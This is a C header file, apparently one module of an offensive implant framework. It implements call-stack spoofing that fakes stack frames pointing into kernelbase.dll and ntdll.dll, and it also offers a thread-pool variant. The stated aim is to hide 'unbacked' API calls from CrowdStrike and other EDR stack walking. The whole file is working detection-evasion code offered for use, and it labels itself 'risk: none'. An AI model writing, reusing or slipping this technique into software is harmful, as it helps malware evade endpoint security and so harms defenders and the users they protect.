// chunk: evasion/stack_spoof
// depends: (none)
// provides: spoof_call
// risk: none
// note: Full call stack spoofing — constructs fake stack frames pointing to
//       legitimate DLL return addresses before making sensitive API calls.
//       CrowdStrike inspects call stacks for "unbacked" execution (calls from
//       non-module memory). This makes every API call appear to originate from
//       within a legitimate Windows DLL (kernelbase.dll or ntdll.dll).
//       Based on SilentMoonwalk / AceLdr techniques.

#ifndef CHUNK_STACK_SPOOF
#define CHUNK_STACK_SPOOF

#include <windows.h>

typedef struct _SPOOF_FRAME {
    PVOID return_addr;
    PVOID saved_rbp;
} SPOOF_FRAME;

static PVOID _gadget_jmp_rbx = NULL;  /* jmp [rbx] gadget in kernelbase */
static PVOID _legit_ret1 = NULL;      /* return address inside kernelbase */
static PVOID _legit_ret2 = NULL;      /* return address inside ntdll */

static void _find_gadgets(void) {
    if (_gadget_jmp_rbx) return;

    HMODULE kb = GetModuleHandleA("kernelbase.dll");
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    if (!kb || !nt) return;

    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS pe;
    PIMAGE_SECTION_HEADER sec;
    BYTE *base, *end;

    /* Find a 'ret' (0xC3) gadget in kernelbase .text for fake return addresses */
    dos = (PIMAGE_DOS_HEADER)kb;
    pe = (PIMAGE_NT_HEADERS)((BYTE *)kb + dos->e_lfanew);
    sec = IMAGE_FIRST_SECTION(pe);
    for (WORD i = 0; i < pe->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            base = (BYTE *)kb + sec->VirtualAddress;
            end = base + sec->Misc.VirtualSize;
            for (BYTE *p = base; p < end - 2; p++) {
                if (*p == 0xC3 && !_legit_ret1) {
                    _legit_ret1 = p;
                } else if (*p == 0xC3 && _legit_ret1 && !_gadget_jmp_rbx) {
                    /* Any ret works as a second gadget */
                    _gadget_jmp_rbx = p;
                }
                if (_legit_ret1 && _gadget_jmp_rbx) break;
            }
            if (_legit_ret1 && _gadget_jmp_rbx) break;
        }
    }

    /* Find a ret in ntdll for the deepest frame */
    dos = (PIMAGE_DOS_HEADER)nt;
    pe = (PIMAGE_NT_HEADERS)((BYTE *)nt + dos->e_lfanew);
    sec = IMAGE_FIRST_SECTION(pe);
    for (WORD i = 0; i < pe->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            base = (BYTE *)nt + sec->VirtualAddress;
            end = base + sec->Misc.VirtualSize;
            for (BYTE *p = base + 0x100; p < end - 2; p++) {
                if (*p == 0xC3) {
                    _legit_ret2 = p;
                    break;
                }
            }
            break;
        }
    }
}

/*
 * spoof_call: Execute a function pointer with a spoofed call stack.
 * Uses RBP-chain manipulation to construct fake frames pointing to
 * legitimate return addresses inside kernelbase.dll and ntdll.dll.
 * EDR stack walking sees: ntdll!RtlUserThreadStart → kernelbase!BaseThreadInitThunk → ...
 *
 * x64 only. Uses GCC inline asm (MinGW compatible).
 */
static PVOID spoof_call(PVOID func, int nargs, ...) {
    _find_gadgets();

    va_list ap;
    va_start(ap, nargs);
    PVOID a0 = nargs > 0 ? va_arg(ap, PVOID) : NULL;
    PVOID a1 = nargs > 1 ? va_arg(ap, PVOID) : NULL;
    PVOID a2 = nargs > 2 ? va_arg(ap, PVOID) : NULL;
    PVOID a3 = nargs > 3 ? va_arg(ap, PVOID) : NULL;
    va_end(ap);

    if (!_legit_ret1 || !_legit_ret2) {
        /* Gadgets not found — direct call fallback */
        typedef PVOID (*fn4)(PVOID, PVOID, PVOID, PVOID);
        return ((fn4)func)(a0, a1, a2, a3);
    }

    PVOID result = NULL;

    /* Build fake stack frames, call target, restore.
       The fake frames make the call appear to originate from kernelbase/ntdll.
       We save/restore RSP, RBP, and the real return address. */
    __asm__ __volatile__ (
        "mov %%rsp, %%r14\n\t"       /* save real RSP */
        "mov %%rbp, %%r15\n\t"       /* save real RBP */
        /* Push fake frame 2: ntdll return address */
        "push %[ret2]\n\t"           /* fake return addr (ntdll) */
        "push %%r15\n\t"             /* fake saved RBP */
        "mov %%rsp, %%rbp\n\t"       /* set RBP to fake frame */
        /* Push fake frame 1: kernelbase return address */
        "push %[ret1]\n\t"           /* fake return addr (kernelbase) */
        "push %%rbp\n\t"             /* link to frame 2 */
        "mov %%rsp, %%rbp\n\t"       /* update RBP chain */
        /* Set up args in registers (x64 Windows calling convention) */
        "mov %[a0], %%rcx\n\t"
        "mov %[a1], %%rdx\n\t"
        "mov %[a2], %%r8\n\t"
        "mov %[a3], %%r9\n\t"
        /* Allocate shadow space (32 bytes) + alignment */
        "sub $0x28, %%rsp\n\t"
        "call *%[fn]\n\t"
        "mov %%rax, %[out]\n\t"
        /* Restore real stack */
        "mov %%r14, %%rsp\n\t"
        "mov %%r15, %%rbp\n\t"
        : [out] "=r" (result)
        : [fn] "r" (func),
          [a0] "r" (a0), [a1] "r" (a1), [a2] "r" (a2), [a3] "r" (a3),
          [ret1] "r" (_legit_ret1), [ret2] "r" (_legit_ret2)
        : "rcx", "rdx", "r8", "r9", "r14", "r15", "rax", "memory"
    );

    return result;
}

/*
 * tp_call: Thread-pool based call stack spoofing.
 * Executes a function via CreateThreadpoolWork — the call stack shows
 * ntdll!TppWorkerThread → kernel32!BaseThreadInitThunk which is
 * completely legitimate. No assembly required.
 * Simpler and more portable than spoof_call, but adds ~1ms latency.
 */
typedef VOID (CALLBACK *PTP_WORK_CALLBACK_FN)(PTP_CALLBACK_INSTANCE, PVOID, PTP_WORK);

static volatile PVOID _tp_result = NULL;
static volatile PVOID _tp_func = NULL;
static volatile PVOID _tp_args[8] = {0};
static volatile int _tp_nargs = 0;

static VOID CALLBACK _tp_dispatch(PTP_CALLBACK_INSTANCE inst, PVOID ctx, PTP_WORK work) {
    (void)inst; (void)ctx; (void)work;

    /* Call the target function via thread pool — stack is clean */
    typedef PVOID (*fn0)(void);
    typedef PVOID (*fn1)(PVOID);
    typedef PVOID (*fn2)(PVOID, PVOID);
    typedef PVOID (*fn4)(PVOID, PVOID, PVOID, PVOID);

    switch (_tp_nargs) {
        case 0: _tp_result = ((fn0)_tp_func)(); break;
        case 1: _tp_result = ((fn1)_tp_func)(_tp_args[0]); break;
        case 2: _tp_result = ((fn2)_tp_func)(_tp_args[0], _tp_args[1]); break;
        case 4: _tp_result = ((fn4)_tp_func)(_tp_args[0], _tp_args[1], _tp_args[2], _tp_args[3]); break;
        default: break;
    }
}

static PVOID tp_call(PVOID func, int nargs, ...) {
    _tp_func = func;
    _tp_nargs = nargs;

    va_list ap;
    va_start(ap, nargs);
    for (int i = 0; i < nargs && i < 8; i++)
        _tp_args[i] = va_arg(ap, PVOID);
    va_end(ap);

    _tp_result = NULL;
    PTP_WORK work = CreateThreadpoolWork((PTP_WORK_CALLBACK)_tp_dispatch, NULL, NULL);
    if (!work) return NULL;

    SubmitThreadpoolWork(work);
    WaitForThreadpoolWorkCallbacks(work, FALSE);
    CloseThreadpoolWork(work);

    return _tp_result;
}

#endif
